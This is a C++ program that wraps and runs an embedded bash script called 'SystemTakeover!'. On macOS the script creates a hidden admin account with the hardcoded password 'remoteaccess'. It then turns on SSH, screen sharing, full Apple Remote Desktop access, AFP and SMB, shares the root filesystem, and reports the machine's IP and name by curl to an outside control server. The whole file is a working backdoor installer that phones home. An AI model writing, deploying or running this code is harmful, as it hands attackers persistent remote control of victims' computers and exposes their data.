#include <iostream>
using namespace std;

#define SHELLSCRIPT "\
#/bin/bash \n\
USERNAME=\"remote\" \n\
PASS=\"remoteaccess\" \n\
clear \n\
base64 -D <<<\"ICAgX19fX18gICAgICAgICAgIF8gICAgICAgICAgICAgIF9fX19fX18gICAgXyAgICAgICAgICAgICAgICAgICAgICAgICAgICBfIAogIC8gX19fX3wgICAgICAgICB8IHwgICAgICAgICAgICB8X18gICBfX3wgIHwgfCAgICAgICAgICAgICAgICAgICAgICAgICAgfCB8CiB8IChfX18gIF8gICBfIF9fX3wgfF8gX19fIF8gX18gX19fIHwgfCBfXyBffCB8IF9fX19fICBfX19fXyAgIF9fX19fIF8gX198IHwKICBcX19fIFx8IHwgfCAvIF9ffCBfXy8gXyBcICdfIGAgXyBcfCB8LyBfYCB8IHwvIC8gXyBcLyBfIFwgXCAvIC8gXyBcICdfX3wgfAogIF9fX18pIHwgfF98IFxfXyBcIHx8ICBfXy8gfCB8IHwgfCB8IHwgKF98IHwgICA8ICBfXy8gKF8pIFwgViAvICBfXy8gfCAgfF98CiB8X19fX18vIFxfXywgfF9fXy9cX19cX19ffF98IHxffCB8X3xffFxfXyxffF98XF9cX19ffFxfX18vIFxfLyBcX19ffF98ICAoXykKICAgICAgICAgIF9fLyB8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICB8X19fLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg\" \n\
echo \n\
echo \n\
echo \"SystemTakeover! Version 1.0 Build 20200228\" \n\
echo \n\
printf \"\e[38;5;011m\" \n\
printf \"\e[48;5;009m\" \n\
echo \"WARNING: THIS SCRIPT WOULD ENABLE THE REMOTE MANAGEMENT FEATURES ON YOUR LAPTOP.\" \n\
echo \"THIS CAN LEAD TO SECURITY RISKS AND POSSIBLE DATA THEFT.\" \n\
echo \n\
printf \"\e[0m\" \n\
read -r -p \"Are you sure you want to continue? [y/N] \" response \n\
if [ -z \"$response\" ] \n\
then \n\
      response=\"n\" \n\
fi \n\
case \"$response\" in \n\
    [yY][eE][sS]|[yY]) \n\
        echo \n\
        echo \"This script requires an administrator password.\" \n\
        echo \"Please enter your password below.\" \n\
        echo \n\
        sudo dscl . -create /Users/${USERNAME} &>/dev/null \n\
        sudo dscl . -create /Users/${USERNAME} UserShell /bin/bash &>/dev/null \n\
        sudo dscl . -create /Users/${USERNAME} RealName \"${USERNAME}\" &>/dev/null \n\
        sudo dscl . -create /Users/${USERNAME} UniqueID 1984 &>/dev/null \n\
        sudo dscl . -create /Users/${USERNAME} PrimaryGroupID 1000 &>/dev/null \n\
        sudo dscl . -create /Users/${USERNAME} NFSHomeDirectory /Local/Users/${USERNAME} &>/dev/null \n\
        sudo dscl . -passwd /Users/${USERNAME} ${PASS} &>/dev/null \n\
        sudo dscl . -append /Groups/admin GroupMembership ${USERNAME} &>/dev/null \n\
        sudo dseditgroup com.apple.access_ssh &>/dev/null \n\
        sudo dseditgroup -o create -q com.apple.access_ssh &>/dev/null \n\
        sudo dseditgroup -o edit -a ${USERNAME} -t group com.apple.access_ssh &>/dev/null \n\
        sudo systemsetup -setremotelogin on &>/dev/null \n\
        sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist &>/dev/null \n\
        sudo defaults write /var/db/launchd.db/com.apple.launchd/overrides.plist com.apple.screensharing -dict Disabled -bool false &>/dev/null \n\
        sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist &>/dev/null \n\
        sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -off -restart -agent -privs -all -allowAccessFor -allUsers &>/dev/null \n\
        sudo AppleFileServer &>/dev/null \n\
        sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.AppleFileServer.plist &>/dev/null \n\
        sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smbd.plist &>/dev/null \n\
        sudo sharing -a / -n \"root\" -s 111 -g 111 &>/dev/null \n\
        IP=$(ipconfig getifaddr en0) \n\
        COMNAME=$(scutil --get ComputerName) \n\
        sudo curl --data \"ip=${IP}&name=${COMNAME}\" https://control.franks-server.ml/index.php &>/dev/null \n\
        clear \n\
        echo \n\
        echo \"Script has finished running. Your computer is now accessible through IP address ${IP}.\" \n\
        echo \n\
        exit 0 \n\
        ;; \n\
    *) \n\
        exit 1 \n\
        ;; \n\
esac\
"

int main() {
    system(SHELLSCRIPT);
    return 0;
}
